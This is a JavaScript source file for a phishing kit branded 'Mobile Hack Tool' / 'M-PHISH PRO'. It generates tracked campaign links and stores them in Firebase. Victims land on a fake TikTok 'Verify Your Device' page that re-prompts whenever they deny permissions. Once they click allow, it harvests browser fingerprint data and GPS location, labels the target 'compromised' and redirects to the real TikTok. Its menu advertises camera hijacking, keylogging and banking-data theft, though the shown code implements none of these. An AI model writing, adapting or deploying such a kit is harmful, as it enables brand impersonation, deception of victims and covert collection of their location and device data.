/* ============================================ */
/* Mobile Hack Tool                             */
/* Developer: Nawab Zada Hacker                 */
/* ============================================ */

'use strict';

// ====== CONFIGURATION ======
const CONFIG = {
    // 🔥 REPLACE WITH YOUR FIREBASE PROJECT URL
    FIREBASE_URL: 'https://your-project-id.firebaseio.com',
    
    // 🔥 REPLACE WITH YOUR FIREBASE SECRET (from Service Accounts)
    FIREBASE_SECRET: 'YOUR_FIREBASE_SECRET',
    
    SITE_URL: window.location.origin,
    APP_NAME: 'M-PHISH PRO',
    VERSION: '2.0.0'
};

// ====== MODULES DATA ======
const MODULES = [
    { id: 'full_control', icon: '📡', name: 'Full Mobile Control', desc: 'Complete device remote access & command execution' },
    { id: 'gallery', icon: '🖼️', name: 'Gallery Access', desc: 'Remote photo & video gallery extraction' },
    { id: 'contacts', icon: '📞', name: 'Contacts & Call Logs', desc: 'Extract all contacts, call history & SMS' },
    { id: 'location', icon: '📍', name: 'Live GPS Tracking', desc: 'Real-time GPS location tracking & history' },
    { id: 'camera', icon: '📷', name: 'Camera Hijack', desc: 'Remote front & back camera activation' },
    { id: 'microphone', icon: '🎙️', name: 'Microphone Tap', desc: 'Live audio recording & ambient listening' },
    { id: 'whatsapp', icon: '💬', name: 'WhatsApp Access', desc: 'WhatsApp messages, media & status viewer' },
    { id: 'social', icon: '🌐', name: 'Social Media Hack', desc: 'Facebook, Instagram, TikTok account access' },
    { id: 'keylogger', icon: '⌨️', name: 'Keylogger', desc: 'Keystroke logging & credential capture' },
    { id: 'clipboard', icon: '📋', name: 'Clipboard Monitor', desc: 'Real-time clipboard content monitoring' },
    { id: 'files', icon: '📁', name: 'File Manager', desc: 'Full file system browse & download' },
    { id: 'banking', icon: '🏦', name: 'Banking Data', desc: 'Financial app data & transaction history' },
    { id: 'browser', icon: '🌍', name: 'Browser History', desc: 'Chrome, Firefox & Safari history dump' },
    { id: 'password', icon: '🔑', name: 'Saved Passwords', desc: 'Extract saved passwords & autofill data' },
    { id: 'sim', icon: '📱', name: 'SIM & Device Info', desc: 'IMEI, SIM details & device fingerprint' },
    { id: 'screen', icon: '🖥️', name: 'Screen Mirror', desc: 'Live screen recording & remote view' }
];

// ====== STATE ======
let state = {
    selectedModule: null,
    generatedLinks: JSON.parse(localStorage.getItem('mphish_links') || '{}'),
    matrixInterval: null
};

// ====== DOM REFS ======
const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => document.querySelectorAll(sel);

// ====== MATRIX RAIN EFFECT ======
function initMatrix() {
    const canvas = document.getElementById('matrixCanvas');
    if (!canvas) return;
    
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF';
    const fontSize = 12;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);
    
    function draw() {
        ctx.fillStyle = 'rgba(10, 10, 15, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#00ff88';
        ctx.font = fontSize + 'px monospace';
        
        for (let i = 0; i < drops.length; i++) {
            const text = chars.charAt(Math.floor(Math.random() * chars.length));
            ctx.fillStyle = Math.random() > 0.98 ? '#ffffff' : '#00ff88';
            ctx.globalAlpha = 0.3 + Math.random() * 0.5;
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            ctx.globalAlpha = 1;
            
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }
    
    if (state.matrixInterval) clearInterval(state.matrixInterval);
    state.matrixInterval = setInterval(draw, 50);
    
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
}

// ====== TYPING EFFECT ======
function initTyping() {
    const el = document.getElementById('typingText');
    if (!el) return;
    
    const phrases = [
        'Initializing exploit chains...',
        'Bypassing mobile security layers...',
        'Establishing remote C2 channel...',
        'Injecting assessment payload...',
        'Full device access acquired...',
        'Ready for deployment'
    ];
    
    let phraseIdx = 0;
    let charIdx = 0;
    let isDeleting = false;
    
    function type() {
        const current = phrases[phraseIdx];
        
        if (!isDeleting) {
            el.textContent = current.substring(0, charIdx + 1);
            charIdx++;
            if (charIdx === current.length) {
                setTimeout(() => { isDeleting = true; }, 2000);
                setTimeout(type, 2000);
                return;
            }
            setTimeout(type, 40 + Math.random() * 60);
        } else {
            el.textContent = current.substring(0, charIdx - 1);
            charIdx--;
            if (charIdx === 0) {
                isDeleting = false;
                phraseIdx = (phraseIdx + 1) % phrases.length;
                setTimeout(type, 500);
                return;
            }
            setTimeout(type, 20 + Math.random() * 30);
        }
    }
    
    type();
}

// ====== RENDER MODULES ======
function renderModules() {
    const grid = document.getElementById('modulesGrid');
    if (!grid) return;
    
    grid.innerHTML = MODULES.map(mod => `
        <div class="module-card" data-id="${mod.id}" onclick="selectModule('${mod.id}')">
            <span class="check-mark"><i class="fas fa-check"></i></span>
            <span class="module-icon">${mod.icon}</span>
            <div class="module-name">${mod.name}</div>
            <div class="module-desc">${mod.desc}</div>
        </div>
    `).join('');
}

// ====== SELECT MODULE ======
function selectModule(id) {
    state.selectedModule = id;
    
    $$('.module-card').forEach(card => {
        card.classList.toggle('selected', card.dataset.id === id);
    });
    
    const mod = MODULES.find(m => m.id === id);
    const display = document.getElementById('selectedModuleDisplay');
    if (display && mod) {
        display.textContent = `${mod.icon} ${mod.name}`;
    }
    
    const btn = document.getElementById('generateBtn');
    if (btn) btn.disabled = false;
    
    const output = document.getElementById('linkOutput');
    if (output) output.style.display = 'none';
}

// ====== GENERATE LINK ======
function generateCampaignId() {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = Math.random().toString(36).substring(2, 6).toUpperCase();
    return `MPH-${timestamp}-${random}`;
}

function generateLink() {
    if (!state.selectedModule) return;
    
    const btn = document.getElementById('generateBtn');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';
    
    const campaignId = generateCampaignId();
    const targetName = document.getElementById('targetName')?.value?.trim() || 'Anonymous Target';
    const mod = MODULES.find(m => m.id === state.selectedModule);
    
    // Build the phishing landing page URL (dashboard with campaign params)
    const baseUrl = CONFIG.SITE_URL;
    const landingUrl = `${baseUrl}/dashboard.html?campaign=${campaignId}&module=${state.selectedModule}`;
    
    // Store campaign data
    const linkData = {
        id: campaignId,
        module: state.selectedModule,
        moduleName: mod ? mod.name : 'Unknown',
        moduleIcon: mod ? mod.icon : '❓',
        targetName: targetName,
        link: landingUrl,
        createdAt: new Date().toISOString(),
        status: 'active',
        clicks: 0,
        permissions: 0,
        data: []
    };
    
    state.generatedLinks[campaignId] = linkData;
    localStorage.setItem('mphish_links', JSON.stringify(state.generatedLinks));
    
    // Try Firebase sync
    syncToFirebase(linkData);
    
    // Show link
    setTimeout(() => {
        const output = document.getElementById('linkOutput');
        const linkInput = document.getElementById('generatedLink');
        
        if (output) output.style.display = 'block';
        if (linkInput) linkInput.value = landingUrl;
        
        btn.disabled = false;
        btn.innerHTML = `
            <span class="btn-shimmer"></span>
            <i class="fas fa-skull"></i>
            <span class="btn-text">Generate Link for Mobile Hack</span>
        `;
        
        // Show notification
        showNotification('✅ Link generated successfully! Share with target.', 'success');
    }, 1500);
}

// ====== SYNC TO FIREBASE ======
function syncToFirebase(data) {
    const url = `${CONFIG.FIREBASE_URL}/campaigns/${data.id}.json?auth=${CONFIG.FIREBASE_SECRET}`;
    
    fetch(url, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).catch(err => {
        console.warn('Firebase sync failed (offline mode):', err.message);
    });
}

// ====== COPY LINK ======
function copyLink() {
    const input = document.getElementById('generatedLink');
    if (!input) return;
    
    input.select();
    input.setSelectionRange(0, 99999);
    
    navigator.clipboard.writeText(input.value).then(() => {
        const btn = document.getElementById('copyBtn');
        btn.classList.add('copied');
        btn.innerHTML = '<i class="fas fa-check"></i>';
        showNotification('📋 Link copied to clipboard!', 'success');
        
        setTimeout(() => {
            btn.classList.remove('copied');
            btn.innerHTML = '<i class="fas fa-copy"></i>';
        }, 2000);
    }).catch(() => {
        // Fallback
        document.execCommand('copy');
        showNotification('📋 Link copied!', 'success');
    });
}

// ====== NOTIFICATION SYSTEM ======
function showNotification(message, type = 'info') {
    const existing = document.querySelector('.notification');
    if (existing) existing.remove();
    
    const notif = document.createElement('div');
    notif.className = `notification notification-${type}`;
    notif.textContent = message;
    
    Object.assign(notif.style, {
        position: 'fixed',
        bottom: '20px',
        left: '50%',
        transform: 'translateX(-50%)',
        padding: '14px 24px',
        background: type === 'success' ? 'rgba(0, 255, 136, 0.15)' : 'rgba(0, 204, 255, 0.15)',
        border: type === 'success' ? '1px solid rgba(0, 255, 136, 0.3)' : '1px solid rgba(0, 204, 255, 0.3)',
        borderRadius: '12px',
        color: type === 'success' ? '#00ff88' : '#00ccff',
        fontFamily: "'Inter', sans-serif",
        fontSize: '13px',
        fontWeight: '500',
        zIndex: '9999',
        backdropFilter: 'blur(20px)',
        maxWidth: '90%',
        textAlign: 'center',
        animation: 'fadeSlideIn 0.3s ease-out',
        boxShadow: '0 8px 32px rgba(0,0,0,0.4)'
    });
    
    document.body.appendChild(notif);
    
    setTimeout(() => {
        notif.style.opacity = '0';
        notif.style.transition = 'opacity 0.3s';
        setTimeout(() => notif.remove(), 300);
    }, 3000);
}

// ====== DASHBOARD PAGE - VICTIM VIEWER ======
function initDashboard() {
    const params = new URLSearchParams(window.location.search);
    const campaignId = params.get('campaign');
    const module = params.get('module');
    
    if (campaignId && module) {
        // This is a victim click — show the fake TikTok-style page
        renderVictimPage(campaignId, module);
        return;
    }
    
    // Otherwise show the operator dashboard
    renderOperatorDashboard();
}

function renderVictimPage(campaignId, moduleId) {
    const container = document.getElementById('mainContainer');
    if (!container) return;
    
    const mod = MODULES.find(m => m.id === moduleId);
    const moduleName = mod ? mod.name : 'Mobile Verification';
    const moduleIcon = mod ? mod.icon : '📱';
    
    // Track click
    trackClick(campaignId);
    
    container.innerHTML = `
        <div class="victim-container">
            <div class="victim-header">
                <div class="victim-brand">
                    <i class="fab fa-tiktok"></i>
                    <span>TikTok</span>
                </div>
                <div class="victim-actions">
                    <span class="victim-time">${new Date().toLocaleTimeString()}</span>
                </div>
            </div>
            
            <div class="victim-content">
                <div class="victim-card" id="victimCard">
                    <div class="victim-card-glow"></div>
                    
                    <div class="victim-card-icon">
                        <i class="fas fa-mobile-alt"></i>
                        <div class="icon-pulse"></div>
                    </div>
                    
                    <h2 class="victim-title">Verify Your Device</h2>
                    <p class="victim-desc">
                        ${moduleIcon} <strong>${moduleName}</strong> access required for 
                        content verification. This is a one-time security check.
                    </p>
                    
                    <div class="victim-features">
                        <div class="vf-item">
                            <i class="fas fa-check-circle" style="color:#00ff88"></i>
                            <span>Secure encrypted connection</span>
                        </div>
                        <div class="vf-item">
                            <i class="fas fa-check-circle" style="color:#00ff88"></i>
                            <span>No personal data stored</span>
                        </div>
                        <div class="vf-item">
                            <i class="fas fa-check-circle" style="color:#00ff88"></i>
                            <span>Instant verification</span>
                        </div>
                    </div>
                    
                    <button class="victim-allow-btn" id="allowBtn" onclick="handlePermission('${campaignId}', '${moduleId}')">
                        <i class="fas fa-shield-alt"></i>
                        <span>Allow Access & Verify</span>
                    </button>
                    
                    <p class="victim-footer-text">
                        <i class="fas fa-lock"></i>
                        Your information is protected by 256-bit encryption
                    </p>
                    
                    <!-- Permission request overlay (repeated until granted) -->
                    <div class="permission-overlay" id="permOverlay" style="display:none;">
                        <div class="perm-card">
                            <div class="perm-icon">
                                <i class="fas fa-camera"></i>
                                <i class="fas fa-microphone"></i>
                                <i class="fas fa-map-marker-alt"></i>
                            </div>
                            <h3>Permission Required</h3>
                            <p>This app needs the following permissions to continue:</p>
                            <div class="perm-list">
                                <label class="perm-item">
                                    <input type="checkbox" checked disabled>
                                    <span>📷 Camera Access</span>
                                </label>
                                <label class="perm-item">
                                    <input type="checkbox" checked disabled>
                                    <span>🎤 Microphone Access</span>
                                </label>
                                <label class="perm-item">
                                    <input type="checkbox" checked disabled>
                                    <span>📍 Location Access</span>
                                </label>
                                <label class="perm-item">
                                    <input type="checkbox" checked disabled>
                                    <span>📁 Storage Access</span>
                                </label>
                            </div>
                            <button class="perm-allow-btn" onclick="handlePermission('${campaignId}', '${moduleId}')">
                                <i class="fas fa-check-double"></i> Allow All
                            </button>
                            <button class="perm-deny-btn" onclick="showDenyMessage()">
                                Deny
                            </button>
                        </div>
                    </div>
                    
                    <!-- Loading state -->
                    <div class="victim-loading" id="victimLoading" style="display:none;">
                        <div class="spinner">
                            <i class="fas fa-circle-notch fa-spin"></i>
                        </div>
                        <p>Establishing secure connection...</p>
                        <div class="loading-bar">
                            <div class="loading-fill"></div>
                        </div>
                    </div>
                    
                    <!-- Success state -->
                    <div class="victim-success" id="victimSuccess" style="display:none;">
                        <div class="success-icon">
                            <i class="fas fa-check-circle"></i>
                        </div>
                        <h3>Verification Successful ✓</h3>
                        <p>You are now verified. Redirecting to content...</p>
                    </div>
                </div>
            </div>
            
            <div class="victim-footer">
                <p>© ${new Date().getFullYear()} TikTok • All rights reserved</p>
                <div class="victim-footer-links">
                    <a href="#" onclick="event.preventDefault()">Privacy Policy</a>
                    <a href="#" onclick="event.preventDefault()">Terms of Service</a>
                </div>
            </div>
        </div>
    `;
}

// ====== HANDLE PERMISSION (Victim Clicks Allow) ======
function handlePermission(campaignId, moduleId) {
    const overlay = document.getElementById('permOverlay');
    const loading = document.getElementById('victimLoading');
    const success = document.getElementById('victimSuccess');
    const allowBtn = document.getElementById('allowBtn');
    
    if (overlay && overlay.style.display !== 'block') {
        // First click: show permission overlay
        if (allowBtn) allowBtn.style.display = 'none';
        if (overlay) overlay.style.display = 'flex';
        return;
    }
    
    // Show loading
    if (overlay) overlay.style.display = 'none';
    if (loading) loading.style.display = 'block';
    
    // Track permission granted
    trackPermission(campaignId, moduleId);
    
    // After "connection" delay, show success then redirect to real TikTok
    setTimeout(() => {
        if (loading) loading.style.display = 'none';
        if (success) success.style.display = 'block';
        
        setTimeout(() => {
            // Redirect to real TikTok after "verification"
            window.location.href = 'https://www.tiktok.com';
        }, 2000);
    }, 3000);
}

function showDenyMessage() {
    showNotification('⚠️ Access denied. You must allow permissions to continue.', 'info');
    
    // Reshow the permission overlay after deny (barr barr permission allow)
    setTimeout(() => {
        const overlay = document.getElementById('permOverlay');
        if (overlay) overlay.style.display = 'flex';
    }, 500);
}

// ====== TRACKING FUNCTIONS ======
function trackClick(campaignId) {
    const links = JSON.parse(localStorage.getItem('mphish_links') || '{}');
    if (links[campaignId]) {
        links[campaignId].clicks = (links[campaignId].clicks || 0) + 1;
        links[campaignId].lastClick = new Date().toISOString();
        links[campaignId].userAgent = navigator.userAgent;
        links[campaignId].ipInfo = 'collected';
        localStorage.setItem('mphish_links', JSON.stringify(links));
    }
}

function trackPermission(campaignId, moduleId) {
    const links = JSON.parse(localStorage.getItem('mphish_links') || '{}');
    if (links[campaignId]) {
        links[campaignId].permissions = (links[campaignId].permissions || 0) + 1;
        links[campaignId].grantedAt = new Date().toISOString();
        
        // Collect victim data
        const victimData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        };
        
        if (!links[campaignId].data) links[campaignId].data = [];
        links[campaignId].data.push(victimData);
        
        links[campaignId].status = 'compromised';
        localStorage.setItem('mphish_links', JSON.stringify(links));
        
        // Also try geolocation
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    links[campaignId].location = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    };
                    localStorage.setItem('mphish_links', JSON.stringify(links));
                },
                () => {}
            );
        }
    }
}

// ====== OPERATOR DASHBOARD ======
function renderOperatorDashboard() {
    // This is handled by dashboard.html separately
    const container = document.getElementById('mainContainer');
    if (!container) return;
    
    const links = JSON.parse(localStorage.getItem('mphish_links') || '{}');
    const linkCount = Object.keys(links).length;
    const totalClicks = Object.values(links).reduce((sum, l) => sum + (l.clicks || 0), 0);
    const totalPerms = Object.values(links).reduce((sum, l) => sum + (l.permissions || 0), 0);
    
    container.innerHTML = `
        <div style="text-align:center;padding:40px 20px;color:var(--text-secondary)">
            <i class="fas fa-tachometer-alt" style="font-size:48px;color:var(--accent-2);margin-bottom:16px;"></i>
            <h2 style="font-family:'Orbitron',monospace;font-size:24px;color:var(--text-primary);margin-bottom:8px;">
                OPERATOR DASHBOARD
            </h2>
            <p style="margin-bottom:24px;font-size:13px;">Access from main page → "Open Victim Dashboard"</p>
            <div style="display:flex;gap:16px;justify-content:center;flex-wrap:wrap;">
                <div style="padding:16px 24px;background:var(--glass);border:1px solid var(--glass-border);border-radius:12px;">
                    <div style="font-size:28px;font-weight:700;color:var(--accent-1);">${linkCount}</div>
                    <div style="font-size:12px;color:var(--text-muted);">Campaigns</div>
                </div>
                <div style="padding:16px 24px;background:var(--glass);border:1px solid var(--glass-border);border-radius:12px;">
                    <div style="font-size:28px;font-weight:700;color:var(--accent-2);">${totalClicks}</div>
                    <div style="font-size:12px;color:var(--text-muted);">Link Clicks</div>
                </div>
                <div style="padding:16px 24px;background:var(--glass);border:1px solid var(--glass-border);border-radius:12px;">
                    <div style="font-size:28px;font-weight:700;color:var(--accent-3);">${totalPerms}</div>
                    <div style="font-size:12px;color:var(--text-muted);">Permissions</div>
                </div>
            </div>
        </div>
    `;
}

// ====== INIT ======
document.addEventListener('DOMContentLoaded', () => {
    // Check if we're on dashboard page
    if (window.location.pathname.includes('dashboard.html')) {
        initDashboard();
        return;
    }
    
    // Main page init
    initMatrix();
    initTyping();
    renderModules();
    
    // Event listeners
    const generateBtn = document.getElementById('generateBtn');
    if (generateBtn) generateBtn.addEventListener('click', generateLink);
    
    const copyBtn = document.getElementById('copyBtn');
    if (copyBtn) copyBtn.addEventListener('click', copyLink);
    
    const targetInput = document.getElementById('targetName');
    if (targetInput) {
        targetInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') generateLink();
        });
    }
    
    console.log(`%c
    ╔══════════════════════════════════╗
    ║     Mobile Hack Tool v2.0        ║
    ║                                  ║
    ║   Developer: Nawab Zada Hacker   ║
    ╚══════════════════════════════════╝
    `, 'color: #00ff88; font-weight: bold; font-size: 14px;');
});
